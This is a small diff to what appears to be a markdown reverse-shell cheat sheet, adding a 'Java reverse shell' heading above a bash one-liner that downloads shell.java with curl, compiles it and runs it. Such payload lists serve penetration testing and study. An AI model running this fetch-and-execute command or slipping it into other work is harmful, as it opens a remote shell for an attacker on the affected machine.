@@ -251,6 +251,8 @@ while true do
 end
 ```
 
+Java reverse shell
+
 ```bash
 curl -s -o shell.java http://localhost/shell.java && javac shell.java | java shell
 ```
